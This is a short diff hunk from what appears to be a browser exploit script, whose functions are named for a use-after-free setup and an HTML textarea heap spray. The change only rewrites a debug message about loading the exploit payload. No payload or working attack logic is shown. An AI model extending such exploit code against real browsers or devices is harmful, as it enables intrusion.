@@ -394,7 +394,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log(" Wait for loading payload ...");
+	debug_log("Please Wait For Exploit Loading PAYLODE ...");
 
 	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
